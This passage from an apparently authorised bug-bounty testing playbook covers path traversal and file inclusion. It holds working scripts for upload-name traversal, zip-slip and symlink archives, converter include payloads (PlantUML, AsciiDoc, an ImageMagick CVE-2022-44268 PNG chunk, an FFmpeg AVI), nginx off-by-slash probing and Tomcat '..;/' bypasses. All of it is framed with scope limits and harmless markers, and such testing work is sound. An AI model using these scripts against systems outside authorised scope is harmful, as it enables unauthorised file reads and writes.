  preview service fetched the URL. The warning `allow_url_include=0`: remote inclusion is closed, and the include
  sink remains for LFI-005.
- **Escalate:** report it with the empty block as the proof; the RCE chapter has the conventions for describing
  code execution that was not performed. A fetch without inclusion: SSR-002 and SSR-003 for internal reach.

### LFI-007 · An upload's file name, or a name inside the uploaded file, is used as a storage path and `../` places a new file outside the upload directory

| | |
|---|---|
| **Severity** | High standalone for a new file outside the upload directory in a served or shared location; Critical when that location executes scripts (described, not done); Medium when the write lands where nothing serves or reads it |
| **Requires** | upload |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Path Traversal · CWE-22 |
| **Prior art** | #671605, #822262, #3485343, #2733190 |

- **Where:** file inputs and upload APIs that keep a name the client sends: the multipart `filename`, a separate
  `name`, `path` or `folder` field, JSON uploads (`{"filename":...,"content":...}`), resumable uploads (`tus`
  `Upload-Metadata`, `X-File-Name`), rename-after-upload actions, and names read from inside the file (a package id
  and version in a registry upload such as #822262, a manifest entry). Some parsers strip directory parts from the
  multipart name before the application sees it: PHP `$_FILES`, Django, Go's `Part.FileName`, multer by default;
  Java servlet parts, Spring `getOriginalFilename()`, ASP.NET Core `IFormFile.FileName`, Werkzeug and Starlette pass
  it through unchanged. The other name fields are never stripped.
- **Test:** upload a harmless file under a unique name and learn where it is stored and served. Upload it again
  with one `../` in front of the name (and the variants a filter may miss) and see whether the stored location moves
  up a directory. Write only new files with unique names, never a name that may already exist, and climb only far
  enough to leave our own directory.
- **How:**
  ```bash
  D="$E/evidence/$H/LFI-007"; mkdir -p "$D"; W=$(awk -v r="$RATE" 'BEGIN{printf "%.2f", 1/r}')
  U="$T/api/files"; R="lfi007-$RANDOM"; printf '%s\n' "$R" > "$D/$R.txt"    # the upload endpoint; R is the marker and the name
  # 1. baseline: where does a normal upload go, and under which URL is it served?
  curl -sS "${HDR[@]}" $A -F "file=@$D/$R.txt;filename=$R-base.txt;type=text/plain" "$U" -o "$D/base.json"; cat "$D/base.json"
  # 2. one level up, in the spellings a filter may miss
  n=0; for f in "../$R-up1.txt" "..%2f$R-up2.txt" "....//$R-up3.txt" "..\\$R-up4.txt" "x/../../$R-up5.txt"; do n=$((n+1))
    curl -sS "${HDR[@]}" $A -F "file=@$D/$R.txt;filename=$f;type=text/plain" "$U" -o "$D/up$n.json" -w "%{http_code} $f\n"; sleep "$W"; done
  grep -ho '"[a-z_]*\(path\|url\|key\|name\)[a-z_]*":"[^"]*"' "$D"/up*.json     # did the stored name keep the dots?
  # 3. fetch each upload one directory above the baseline file's directory
  B=$(grep -o '"url":"[^"]*"' "$D/base.json" | head -1 | cut -d'"' -f4); case $B in http*) ;; *) B="$T$B";; esac
  UP=${B%/*}; UP=${UP%/*}
  for i in 1 2 3 4 5; do curl -sS "${HDR[@]}" $A "$UP/$R-up$i.txt" -o "$D/fetch$i.txt" -w "%{http_code} $UP/$R-up$i.txt\n"; sleep "$W"; done
  grep -l "$R" "$D"/fetch*.txt
  ```
  For a name field other than the multipart name, send the same five values in that field. With `two-accounts` and
  per-account directories, the strongest proof is a new file appearing in B's own folder or listing.
- **Proof:** the marker file fetched from a URL one directory above the baseline's directory (or the stored path in
  the response showing it), which the baseline name can never produce, with the upload request that carried the
  name. Delete the files through the application where it offers a delete action, and list any that remain in
  `cleanup.md` (`docs/04-evidence-standard.md`).
- **Not a finding when:** the response keeps the dots in the name but the file is served from the baseline
  directory under a generated key: the name is metadata only. The dots are removed and `$R-up1.txt` sits next to
  the baseline: sanitised; record `negative`. The escape lands one level up but still inside our own area (from
  `/uploads/<our id>/docs/` to `/uploads/<our id>/`): the boundary is our id, so climb one more level only if that
  is where other accounts' directories start. The climbing names fail with `Permission denied` or
  `No such file or directory` while the baseline succeeds: the path is unconfined but nothing was written; record
  `candidate`, report only a write that succeeded.
- **Escalate:** a write into a directory the application's origin serves: an `.html` or `.svg` file there is the
  stored-XSS chain (XSS and UPL chapters); a directory that executes scripts (`.php`, `.jsp`, `.aspx`) is code
  execution, described and not done. Name the files an overwrite would hit (templates, `authorized_keys`, cron
  entries) and do not attempt one. Keys in object storage: LFI-011.

### LFI-008 · An archive the server extracts writes an entry named `../` outside the extraction directory, or a symlink entry makes it return a local file

| | |
|---|---|
| **Severity** | High standalone for a local file returned through a symlink entry or a new file written outside the extraction directory; Critical when the write lands in a directory that executes scripts (described, not done) |
| **Requires** | file-processing |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Path Traversal · CWE-22; Improper Link Resolution Before File Access ('Link Following') · CWE-59 |
| **Prior art** | #213558, #1754811, #765291, #205481 |

- **Where:** "import from ZIP or tar", backup restore (#213558), bulk upload of a folder, theme, template or plugin
  packages a non-admin can upload, SCORM and e-learning packages, static-site deploys (#1754811), project import,
  and any upload whose members are listed, served or imported afterwards. How the members surface (a listing, a URL
  per member, imported records) decides how the result is read back.
- **Test:** extraction code joins the destination directory with each entry name; without a check after the join
  is resolved, `../` in a name lands outside (zip slip). A symlink entry is created as a link when the extractor is
  GNU tar, bsdtar or Info-ZIP `unzip`; when the application then serves or imports that member, it returns the file
  the link points to.
- **How:**
  ```bash
  D="$E/evidence/$H/LFI-008"; mkdir -p "$D"; W=$(awk -v r="$RATE" 'BEGIN{printf "%.2f", 1/r}'); R="lfi008-$RANDOM"
  # 1. four archives: ../ entries (zip, tar), a symlink entry (zip, tar), each with one normal member as the baseline
  R="$R" python3 - "$D" <<'PY'
  import io, os, sys, tarfile, zipfile
  d, r = sys.argv[1], os.environ['R']
  body = (r + '\n').encode()
  def tar(name, members):
      with tarfile.open(os.path.join(d, name), 'w:gz') as t:
          for n, link in members:
              ti = tarfile.TarInfo(n)
              if link:
                  ti.type, ti.linkname = tarfile.SYMTYPE, link
                  t.addfile(ti)
              else:
                  ti.size = len(body)
                  t.addfile(ti, io.BytesIO(body))
  with zipfile.ZipFile(os.path.join(d, r + '-slip.zip'), 'w') as z:
      for n in (r + '-base.txt', '../' + r + '-up1.txt', '../../' + r + '-up2.txt'):
          z.writestr(n, body)
  with zipfile.ZipFile(os.path.join(d, r + '-link.zip'), 'w') as z:
      zi = zipfile.ZipInfo(r + '-link.txt'); zi.create_system = 3; zi.external_attr = 0o120777 << 16
      z.writestr(zi, '/etc/hostname'); z.writestr(r + '-base.txt', body)
  tar(r + '-slip.tar.gz', [(r + '-base.txt', None), ('../' + r + '-up1.txt', None), ('../../' + r + '-up2.txt', None)])
  tar(r + '-link.tar.gz', [(r + '-base.txt', None), (r + '-link.txt', '/etc/hostname')])
  PY
  unzip -l "$D/$R-slip.zip"; tar -tvzf "$D/$R-link.tar.gz"
  # 2. upload each through the import feature and keep the import result
  for f in "$R-slip.zip" "$R-link.zip" "$R-slip.tar.gz" "$R-link.tar.gz"; do
    curl -sS "${HDR[@]}" $A -F "archive=@$D/$f" "$T/api/import" -o "$D/$f.json" -w "%{http_code} $f\n"; sleep "$W"; done
  ```
  Then read back: the extracted member list (does `../$R-up1.txt` appear, stripped to `$R-up1.txt`, or refused?);
  the URL of `$R-base.txt`, and the same URL one and two directories up for `$R-up1.txt` and `$R-up2.txt`; the
  content served or imported for `$R-link.txt`. A link to a directory followed by a member inside it (`d -> /tmp`,
  then `d/$R.txt`) writes through the link past `../` checks: build it the same way when `../` is stripped and
  links are kept.
- **Proof:** zip slip: the marker file read from the location above the extraction directory, the listing or URL
  showing where `$R-base.txt` went, and the `unzip -l` or `tar -tvzf` output of the archive. Symlink: the content of
  `/etc/hostname` returned where the application serves or imports `$R-link.txt`, with the `tar -tvzf` line showing
  the link. Remove the imported objects through the application and record anything left in `cleanup.md`.
- **Not a finding when:** the member list shows `$R-up1.txt` at the top level or the import refuses the entry:
  names are sanitised (Python's `zipfile`, current node-tar and Python 3.12+ tar filters strip `../`, absolute names
  and outside links; hand-written loops over Java's `ZipInputStream` or old Python `tarfile` usually do not). The
  link member comes back as a 13-byte text file holding `/etc/hostname`: the extractor stored the link as a plain
  file (Java and Python `zipfile` do). The `../` file lands in a throwaway job directory's parent that nothing
  serves or reads: a write with no effect. A plugin or theme upload that installs code by design and is open only to
  administrators: uploading code is the feature.
- **Escalate:** a member written into a served or executing directory: as LFI-007, described and not planted.
  Imports that also copy files the archive's manifest names: LFI-009. A known extraction CVE in the identified
  product: the CVE chapter.

### LFI-009 · A file reference stored in our content or an import manifest is dereferenced by a later copy, move, import or export job, which reads a file outside the upload store

| | |
|---|---|
| **Severity** | High standalone for an arbitrary file copied into our project; Critical when the job runs on the shared infrastructure of a multi-tenant platform, where the same read reaches every tenant's data (state it, do not show it) |
| **Requires** | upload\|file-processing, account |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Path Traversal · CWE-22 |
| **Prior art** | #1439593, #827052, #1132378, #484615 |

- **Where:** actions that copy attachments: move or duplicate an issue, ticket, page or document to another project
  (#827052); copy a workspace; export a project and import it again (#1132378); bulk import from another instance
  (#1439593); restore a backup; "attach existing file" by path; profile-photo or avatar paths kept as text
  (#484615). The reference is whatever the application writes into content or metadata to point at an upload: a
  markdown link `/uploads/<random>/<name>`, an `attachment_path` field, a path inside an export's JSON manifest. Use
  two containers of our own (two projects or workspaces of account A) as source and destination.
- **Test:** the request that stores the reference opens no file, so nothing checks it. The job that runs later
  resolves the reference to a path on disk and copies the file into the destination with the service's
  permissions. Keep every segment the application generated (the random directory, the id) and change only the
  file-name part so the path climbs out of the upload store.
- **How:**
  ```bash
  D="$E/evidence/$H/LFI-009"; mkdir -p "$D"; W=$(awk -v r="$RATE" 'BEGIN{printf "%.2f", 1/r}')
  SRC=101; DST=102                     # two projects of account A: source and destination of the move
  # 1. the reference format: upload a file and read what the application writes into content for it
  printf 'lfi009\n' > "$D/lfi009.txt"
  curl -sS "${HDR[@]}" $A -F "file=@$D/lfi009.txt;type=text/plain" "$T/api/projects/$SRC/uploads" -o "$D/upload.json"; cat "$D/upload.json"
  #    for example {"url":"/uploads/4f9c2e.../lfi009.txt","markdown":"[lfi009.txt](/uploads/4f9c2e.../lfi009.txt)"}
  REF=$(grep -o '"url":"[^"]*"' "$D/upload.json" | head -1 | cut -d'"' -f4)
  EVIL="${REF%/*}/../../../../../../../../../../etc/hostname"      # generated segments kept, the name replaced
  # 2. store content that carries the edited reference
  curl -sS "${HDR[@]}" $A -X POST "$T/api/projects/$SRC/issues" -H 'Content-Type: application/json' \
    -d "{\"title\":\"lfi009\",\"description\":\"[lfi009]($EVIL)\"}" -o "$D/issue.json"
  ID=$(grep -o '"id":[0-9]*' "$D/issue.json" | head -1 | cut -d: -f2)
  # 3. run the job that copies attachments, then open the copy it wrote into the destination
  curl -sS "${HDR[@]}" $A -X POST "$T/api/projects/$SRC/issues/$ID/move" -H 'Content-Type: application/json' \
    -d "{\"to_project_id\":$DST}" -o "$D/moved.json"; sleep "$W"
  NEW=$(grep -o '/uploads/[^)"]*' "$D/moved.json" | head -1); echo "$NEW"
  curl -sS "${HDR[@]}" $A "$T$NEW" -o "$D/copied.bin" -w '%{http_code} %{size_download}\n'; head -c 200 "$D/copied.bin"
  ```
  Import variant: export one of A's projects, unpack it, change one attachment path in the manifest the same way,
  repack it with the original layout and import it as a new project of A:
  ```bash
  mkdir -p "$D/x" && tar -xzf "$D/export.tar.gz" -C "$D/x"
  grep -rlE '"[a-z_]*path"|/uploads/' "$D/x" | head        # the manifest entries that name files
  # edit one entry to ../../../../../../../../etc/hostname (generated segments kept), then repack and import
  tar -czf "$D/import.tar.gz" -C "$D/x" .
  ```
- **Proof:** the copied attachment in our destination project containing `/etc/hostname`, with the stored
  reference, the trigger request and the job's response; or the imported attachment from the edited manifest. One
  file. In the report, say that the job runs as the service user and name what it could therefore read (repository
  data, configuration, other tenants' uploads) without reading it.
- **Not a finding when:** the copy holds our original `lfi009.txt`, or an empty or "missing file" placeholder: the
  job looks the upload up by its id or generated directory and ignores the name. The edited reference is rejected
  on save or on import with a validation error. The link only renders in the browser and the destination shows the
  same URL as the source: no server-side copy was made. A reference to another account's upload by its id is an
  authorisation question, BAC-007.
- **Escalate:** the same job usually writes the copy under a name taken from the reference: test the write
  direction (a destination name with `../`) on our own projects only, with a new file name. Archive imports:
  LFI-008. Secrets the job could read feed DSR-005, DSR-009 and DSR-011 as described chains.

### LFI-010 · A server-side converter or renderer follows a local file reference written in our file or markup and puts the file's bytes in its output

| | |
|---|---|
| **Severity** | High standalone when a local file's bytes appear in the output; Medium when the converter only follows a remote reference (SSR-008) |
| **Requires** | file-processing\|render |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | External Control of File Name or Path · CWE-73 |
| **Prior art** | #518641, #1098793, #1062888, #226756 |

- **Where:** video and image uploads that are transcoded or thumbnailed (FFmpeg: #1062888, #226756; ImageMagick),
  and fields or files the server renders in a format that has an include feature: diagram blocks (PlantUML, through
  Kroki or a wiki plugin: #1098793), AsciiDoc and reStructuredText documents or wiki pages, LaTeX in reports or
  formula fields, Markdown with an include extension (#518641). HTML rendered to PDF or images
  (`<iframe src="file:///etc/hostname">`) is SSR-007; SVG with entities is XXE-007.
- **Test:** the include is a feature of the format, not a parser bug, so the converter opens the path unless a safe
  mode is on. Put a reference to `/etc/hostname` where the output shows text: a video frame, an image text chunk,
  a diagram note, the rendered document.
- **How:**
  ```text
  PlantUML (a diagram block, or POST to a Kroki endpoint): the included line becomes note text
    @startuml
    note as N
    !include /etc/hostname
    end note
    @enduml
  AsciiDoc:           include::/etc/hostname[]      and, when jailed to a base directory, include::../../../../../../etc/hostname[]
  reStructuredText:   .. include:: /etc/hostname
  LaTeX:              \input{/etc/hostname}         or \verbatiminput{/etc/hostname} (verbatim package)
  Markdown include:   {!/etc/hostname!}             (markdown-include extension)
  ```
  ```bash
  D="$E/evidence/$H/LFI-010"; mkdir -p "$D"
  # Kroki-style renderer: the diagram source as the body, the image back
  printf '@startuml\nnote as N\n!include /etc/hostname\nend note\n@enduml\n' > "$D/lfi010.puml"
  curl -sS "${HDR[@]}" $A -X POST "$T/kroki/plantuml/png" -H 'Content-Type: text/plain' --data-binary @"$D/lfi010.puml" -o "$D/diagram.png"
  # ImageMagick (CVE-2022-44268 builds): a PNG text chunk named "profile" makes the converter embed that file in its output
  python3 - clean.png "$D/lfi010.png" <<'PY'
  import struct, sys, zlib
  src, out = sys.argv[1], sys.argv[2]
  png = open(src, 'rb').read()
  data = b'profile\x00/etc/hostname'
  chunk = struct.pack('>I', len(data)) + b'tEXt' + data + struct.pack('>I', zlib.crc32(b'tEXt' + data) & 0xffffffff)
  i = png.index(b'IDAT') - 4                      # insert before the first image-data chunk
  open(out, 'wb').write(png[:i] + chunk + png[i:])
  PY
  curl -sS "${HDR[@]}" $A -F "file=@$D/lfi010.png;type=image/png" "$T/api/avatar" -o "$D/up.json"
  # download the resized copy the application now serves for it as out.png, then decode the profile it carries
  python3 - "$D/out.png" <<'PY'
  import struct, sys, zlib
  b = open(sys.argv[1], 'rb').read(); i = 8
  while i < len(b):
      n, t = struct.unpack('>I4s', b[i:i + 8]); d = b[i + 8:i + 8 + n]; i += 12 + n
      if t in (b'tEXt', b'zTXt'):
          k, v = d.split(b'\x00', 1)
          if t == b'zTXt':
              v = zlib.decompress(v[1:])
          if b'profile' in k.lower():
              toks = v.decode().split(); j = next(x for x, s in enumerate(toks) if s.isdigit())
              print(k.decode(), bytes.fromhex(''.join(toks[j + 1:])).decode(errors='replace'))
  PY
  # FFmpeg HLS: an AVI that embeds a playlist naming file:///etc/hostname (generator: github.com/neex/ffmpeg-avi-m3u-xbin)
  python3 gen_xbin_avi.py file:///etc/hostname "$D/lfi010.avi"
  curl -sS "${HDR[@]}" $A -F "video=@$D/lfi010.avi;type=video/x-msvideo" "$T/api/videos" -o "$D/video.json"
  # download the transcoded video or its thumbnail as transcoded.mp4, then look at one frame
  ffmpeg -loglevel error -i "$D/transcoded.mp4" -frames:v 1 "$D/frame.png"
  ```
- **Proof:** the output (the rendered diagram or document, the decoded profile, the video frame) showing the content
  of `/etc/hostname`, next to the uploaded file or the markup and the request. One screenshot or the decoded bytes
  is enough.
- **Not a finding when:** the output shows the reference as text or a link: a safe mode is on (Asciidoctor's
  `secure` mode, the default for its API, turns `include::` into a link; Kroki's default safe mode and PlantUML's
  `SANDBOX` and `INTERNET` security profiles refuse local includes; docutils with `file_insertion_enabled` off
  ignores `.. include::`). AsciiDoc in `safe` or `server` mode reads includes only inside its base directory, and
  the jail error is not a finding. FFmpeg refuses the playlist (`is not in allowed_extensions` in a job error, or no
  frames): a current build. The ImageMagick chunk is ignored outside the CVE-2022-44268 builds, and programmes that
  exclude known CVEs inside their patch window close that variant (`known-cve`). The file is rendered by your own
  browser (client-side Mermaid, a JavaScript Markdown preview): the browser has no access to the server's disk.
- **Escalate:** the same converters fetch URLs: SSR-008 for `http://` references, SSR-007 for HTML renderers. A
  version-specific converter bug: the CVE chapter. Read a second file only if the policy asks for more than
  `/etc/hostname`.

### LFI-011 · A storage key built from our file name or key parameter is normalised before the object-store call, so `../` reads or writes outside our own prefix

| | |
|---|---|
| **Severity** | High standalone when another account's object is read or written, proven on B; Medium for a new object written into a shared prefix that others are served; Low when it lands where nothing reads it |
| **Requires** | cloud-storage, upload\|file-param |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Path Traversal · CWE-22 |
| **Prior art** | #254200, #3580511, #2334455 |

- **Where:** uploads and downloads whose URLs or responses show a bucket (`<bucket>.s3.amazonaws.com/<prefix>/<user
  id>/<name>`, `storage.googleapis.com/<bucket>/...`, `<account>.blob.core.windows.net/<container>/...`): pre-signed
  upload requests that take a file name (`POST /api/uploads/presign {"filename":...}`), avatar uploads (#254200),
  download proxies that take a key or name (`/api/files/download?name=`), image resizers that read from a bucket by
  key, blob keys a client may choose (#3580511).
- **Test:** an object store has no directories and keeps `a/../b` as a literal key. The prefix escape needs a layer
  that resolves dot segments first: the application building the key with a filesystem function (`path.join`,
  `os.path.normpath`, `Paths.get(...).normalize()`), or a proxy or CDN in front of the bucket normalising the URL.
  Read the key the application signed or requested, not the name you sent.
- **How:**
  ```bash
  D="$E/evidence/$H/LFI-011"; mkdir -p "$D"; W=$(awk -v r="$RATE" 'BEGIN{printf "%.2f", 1/r}')
  U="$T/api/uploads/presign"; R="lfi011-$RANDOM"    # the request that returns an upload URL or key for a file name
  # 1. how is the key built? a plain name, then names that climb out of our prefix
  n=0; for f in "$R.txt" "../$R-up1.txt" "../../$R-up2.txt" "x/../../$R-up3.txt" "..%2f$R-up4.txt"; do n=$((n+1))
    curl -sS "${HDR[@]}" $A -X POST "$U" -H 'Content-Type: application/json' \
      -d "{\"filename\":\"$f\",\"contentType\":\"text/plain\"}" -o "$D/presign$n.json" -w "%{http_code} [$f]\n"; sleep "$W"; done
  grep -ho '"key":"[^"]*"\|https://[^"?]*' "$D"/presign*.json   # literal ../ in the key is harmless; a key outside the prefix is the bug
  # 2. only for a key that left the prefix: upload the marker with the URL the application signed, then read it back
  printf '%s\n' "$R" > "$D/$R.txt"
  curl -sS "${HDR[@]}" -X PUT -H 'Content-Type: text/plain' --data-binary @"$D/$R.txt" --path-as-is "<signed URL from that presign file>" -w '%{http_code}\n'
  # 3. read direction, with account B: a download that prefixes our id, aimed at an object B uploaded
  curl -sS "${HDR[@]}" $A --get --data-urlencode "name=../<B id>/<B file name>" "$T/api/files/download" -o "$D/b.bin" -w '%{http_code} %{size_download}\n'
  ```
  The PUT goes to the storage host: it must be in the programme's scope or named in the engagement's
  `allow-infra.txt`, and the scope guard refuses it otherwise.
- **Proof:** the key returned for the traversal name resolved outside our prefix (step 1 output, the pre-signed
  URL's path with the signature removed) and the marker object fetched from where it landed; or B's object
  returned to A, with B's own view of it.
- **Not a finding when:** the key keeps the dots (`uploads/123/../lfi011-up1.txt`): the store saved a literal key
  that still starts with our prefix. The key is generated (a UUID) and the name is only metadata
  (`Content-Disposition`). The storage refuses the upload: a POST policy with `starts-with $key uploads/123/` or a
  signature over the exact key. The object lands outside our prefix in a place nobody else reads or serves: record
  it `parked`. Reading or listing a bucket directly because its policy is public: the CLD chapter. A download proxy
  that checks ownership in the database before it builds the key answers 403 for B's object.
- **Escalate:** a write into a prefix served on the main site (static assets, a bucket website) is stored XSS or
  script replacement: describe it and stop at the new file (XSS and CLD chapters). A read of B's object is rated as
  a cross-account read (BAC chapter for sensitivity and scale).

### LFI-012 · An nginx `alias` without a trailing slash on its `location` serves the parent directory of a static root (off-by-slash)

| | |
|---|---|
| **Severity** | Medium standalone for reading the parent directory of a static root (source or configuration shown with one innocuous file); High when a file there holds credentials (named, not used) |
| **Requires** | reverse-proxy |
| **Excluded by** | — |
| **Unit** | host |
| **Cost** | low |
| **Weakness** | Path Traversal · CWE-22 |
| **Prior art** | #1650273, #446330, #1386547, #312510 |

- **Where:** prefixes that serve static files from an nginx front end (`Server: nginx`, the nginx default 404 or
  403 page): `/static`, `/assets`, `/media`, `/public`, `/images`, `/img`, `/js`, `/css`, `/files`, `/uploads`,
  `/build`, `/dist`, and any prefix the crawl shows serving files. The unit is the host because `location` blocks
  belong to the host's server block. There is no `nginx` fact; on a front end that is not nginx (HAProxy, a cloud
  load balancer, a CDN with no nginx behind it) the first loop shows no difference and the card is closed.
- **Test:** `location /static { alias /srv/app/static/; }` maps `/static../x` to `/srv/app/static/../x`, which is
  `/srv/app/x`. The request contains no `/../` segment, so nginx's own normalisation lets it through. The parent of
  a static directory is often the application root: source, settings, `.git`, `.env`. Only one level can be
  climbed: nginx removes `/../` before matching, so `/static../../` is resolved away.
- **How:**
  ```bash
  D="$E/evidence/$H/LFI-012"; mkdir -p "$D"; W=$(awk -v r="$RATE" 'BEGIN{printf "%.2f", 1/r}')
  # one known file under each static prefix of this host (from the crawl): prefix, then the file's path below it
  while read -r pfx f; do
    for p in "/$pfx/$f" "/$pfx../$pfx/$f" "/${pfx}x../$pfx/$f" "/$pfx../" "/${pfx}x../"; do
      curl -sS "${HDR[@]}" --path-as-is -o "$D/$(printf %s "$p" | md5sum | cut -c1-8).body" -w "%{http_code} %{size_download} $p\n" "$T$p"
      sleep "$W"; done; done <<'EOF' | tee "$D/oracle.txt"
  static css/app.css
  assets application.js
  media logo.png
  EOF
  # for the prefix that showed the oracle: one innocuous file from the parent directory
  for f in .git/HEAD package.json composer.json Gemfile manage.py requirements.txt Dockerfile; do
    curl -sS "${HDR[@]}" --path-as-is -o "$D/parent-${f//\//_}" -w "%{http_code} %{size_download} /static../$f\n" "$T/static../$f"; sleep "$W"; done
  ```
  The oracle: `/static../static/css/app.css` returns the same bytes as `/static/css/app.css`, while
  `/staticx../static/css/app.css` is a 404 (the location still matches, and `x..` is no directory). `/static../`
  answering 403 (a directory without an index) where `/staticx../` answers 404 shows the same thing.
- **Proof:** the oracle pair and one innocuous file from the parent directory (`.git/HEAD`, `package.json`), saved
  raw. Name the sensitive files that sit there (`.env`, `settings.py`, `config/`) without fetching them.
- **Not a finding when:** both oracle rows answer the same 404: the `location` ends with a slash, or `root` is used
  instead of `alias`. A CDN or the application answers every path with the same 200 page: compare the hashes with
  the `x..` control. The parent directory holds only other public assets or an empty deploy directory: a traversal
  with nothing to read, low or informative.
- **Escalate:** `.git` reachable: INF-001 rebuilds the source. Settings with secrets: name them and describe the
  DSR-009 or DSR-011 chain. Another alias one level up can be climbed again from its own prefix. Other front-end
  disagreements on the same host: LFI-013 and BAC-018.

### LFI-013 · A Java back end behind a front end resolves `..;/`, so a forwarded prefix reaches contexts and routes the front end never forwards

| | |
|---|---|
| **Severity** | High standalone when the escape returns an administrative function or private data; Medium for an internal page with limited content; None when only a login prompt or a default page is reached |
| **Requires** | reverse-proxy, java |
| **Excluded by** | — |
| **Unit** | host |
| **Cost** | low |
| **Weakness** | Path Traversal · CWE-22 |
| **Prior art** | #1004007, #988877 |

- **Where:** hosts with a Java back end (`JSESSIONID`, a Tomcat, Jetty or JBoss error page, `X-Application-Context`)
  behind a front end that forwards only some prefixes: the application at `/app/` or `/api/`, while `/manager/`,
  `/host-manager/`, `/actuator/`, `/jolokia/`, `/console/` or other web applications of the same server answer 404
  or 403 from the front end. BAC-018 tries this spelling among thirty others against paths that answer 401 or 403;
  this card starts from a forwarded prefix and climbs out of it, including to routes the front end never forwards.
- **Test:** nginx, Apache httpd and most gateways see `..;` as an ordinary segment and forward
  `/app/..;/manager/html` under the `/app/` rule. Tomcat and Jetty remove the `;` path parameter from each segment
  and then resolve `..`, so the back end serves `/manager/html`. One `..;/` is needed per segment of the forwarded
  prefix; `/;/` at the start is the same trick for front ends that match on the first segment.
- **How:**
  ```bash
  D="$E/evidence/$H/LFI-013"; mkdir -p "$D"; W=$(awk -v r="$RATE" 'BEGIN{printf "%.2f", 1/r}')
  PUB=/app/        # a prefix the front end forwards to the Java back end; one ..;/ per segment of it
  for x in manager/html host-manager/html actuator jolokia/version examples/; do
    for p in "/$x" "${PUB}..;/$x" "${PUB}..;/..;/$x" "/;/$x"; do
      k=$(printf %s "$p" | md5sum | cut -c1-8)
      curl -sS "${HDR[@]}" --path-as-is -D "$D/$k.hdr" -o "$D/$k.body" -w "%{http_code} %{size_download} $k $p\n" "$T$p"; sleep "$W"
    done; done | tee "$D/results.txt"
  curl -sS "${HDR[@]}" --path-as-is -o /dev/null -w '%{http_code} control\n' "$T${PUB}..;/lfi013-does-not-exist"
  grep -i '^server:\|^www-authenticate:' "$D"/*.hdr     # which layer answered each row
  ```
  A hit is a row that differs from the direct request: the Tomcat manager's own 401 with
  `WWW-Authenticate: Basic realm="Tomcat Manager Application"` instead of the front end's 404, the actuator index
  as JSON, a Jolokia version object. Fetch the one page or JSON document that holds data and stop.
- **Proof:** the direct request answered by the front end and the `..;/` request answered by the back end, side by
  side with headers, then the one page the escape reaches that holds data or a function (the actuator's endpoint
  list, Jolokia's version object, a status page). A login prompt alone shows reach, not impact.
- **Not a finding when:** the route reached asks for the same credentials (the manager's Basic prompt): the
  front-end rule was defence in depth, so report only with something readable behind it; default credentials are
  CVE-007 and need the policy's permission for login attempts. Every `..;/` row gets the front end's 400 or 404,
  or a 400 from the application itself (Spring Security's `StrictHttpFirewall` rejects `;` in a URL). The page
  reached is public anyway or an empty default page (Tomcat's ROOT, `/examples` with nothing exposed).
- **Escalate:** actuator endpoints: INF-005 (index and health here; `env` and `heapdump` are named, not pulled).
  Jolokia, the manager and other consoles: CVE-008 and CVE-011. The same front end may also serve static files
  through an alias: LFI-012.

## Graveyard

- **A full path in an error message** (`/var/www/app/download.php on line 12`). Information only (`internal-info`);
  useful for choosing the climb depth.
- **A `../` that stays inside the web root**, or reads files that are public anyway (`../css/app.css`,
  `../robots.txt`). No boundary was crossed.
- **Reading your own sandbox.** File reads inside a build container, notebook, online IDE or job workspace that the
  product hands you: by design unless the read reaches the host or another tenant (the worker-escape reports,
  #694181 and #697055, paid because they reached the host).
- **Known-CVE traversal by version or by a scanner hit** (Grafana 8, Apache 2.4.49 and 2.4.50, Cisco ASA
  CVE-2020-3452 and CVE-2018-0296): duplicated on any programme public for a while, and excluded inside the patch
  window (`known-cve`). The CVE chapter verifies them with the advisory's request.
- **Scanner output** (`automated`): "possible LFI" from a reflected `../` or a matched error string, with no file.
- **"LFI to RCE" without the route.** A readable log reported as code execution, with no include sink shown and no
  marker read back through it. Programmes rate what was shown.
- **Null byte or overlong UTF-8 accepted** with no read: current stacks reject or ignore them; the report needs the
  file.
- **Client-side path traversal reported as a file read.** The browser's fetch path changed and no server file was
  read; it is a CSRF or XSS primitive (#1860380, #2473862) and belongs to those chapters.
- **Traversal in a mobile or desktop client** (attachment downloads that write anywhere, zip extraction on the
  device): not a finding against the web asset.
- **Denial of service by file read** (`/dev/zero`, `/dev/random`, `/proc/self/fd/0`, a multi-gigabyte log): a hung
  worker is the test (`dos`); never sent.
- **Pulling secrets to show impact** (`.env`, `wp-config.php`, `~/.aws/credentials`): most policies forbid it, and
  the report is rated the same with `/etc/passwd` read and the file named.
- **Off-by-slash into an empty parent**: a static root whose parent holds only other public assets; low or
  informative.
- **A write that only produced an error**: `Permission denied` for a climbing upload name proves nothing was
  written.

## Chains

- LFI-001, LFI-002, LFI-003, LFI-012 (file read) → DSR-005 (`web.config` machineKey), DSR-009 (Laravel `APP_KEY`),
  DSR-011 (Rails `secret_key_base`): a key read this way becomes forged state and code execution. Describe the
  chain; pull a key only when the policy allows.
- LFI-004 → DSR-008: a `phar://` path that reaches a file function deserializes our upload's metadata.
- LFI-007, LFI-008, LFI-011 (write into a served directory or prefix) → XSS chapter (stored HTML or SVG on the
  origin) and RCE chapter (a script directory): described, not planted.
- UPL (upload restrictions bypassed) → LFI-005: an uploaded marker file is the include target.
- XXE-001, SSR-007, SSR-009 (`file://` through a parser, a renderer or a fetcher) → the same proof files and the same
  severity as this chapter.
- JWT-005 (`kid` taken as a path) → a file-read and file-existence primitive in the token header.
- API-008: an id copied into an internal API path is LFI-001's path test applied to an HTTP back end.
- LFI-012, LFI-013 → INF-001 (`.git` in the parent directory), INF-005 (actuator), CVE-008 and CVE-011 (management
  interfaces reached), BAC-018 (other spellings of the same front-end disagreement).
- LFI-009 and BAC-007: the same copy job, aimed at another account's object by id instead of at a path.
- LFI-010 → SSR-008: the converters that read local files also fetch URLs.

## Sources

- `kb/reports/traversal.md` and `kb/reports/all/traversal.md`: the disclosed reports this chapter is built from.
- HexBrain: `get_testing_playbook {"topic":"Path Traversal"}`, `find_bypasses {"protection":"path traversal filter"}`,
  `find_payloads {"topic":"Directory Traversal"}`, `find_payloads {"topic":"File Inclusion"}`.
- PortSwigger Web Security Academy, Path traversal; OWASP WSTG-ATHZ-01 (Testing Directory Traversal File Include);
  PayloadsAllTheThings, Directory Traversal, File Inclusion and Zip Slip.
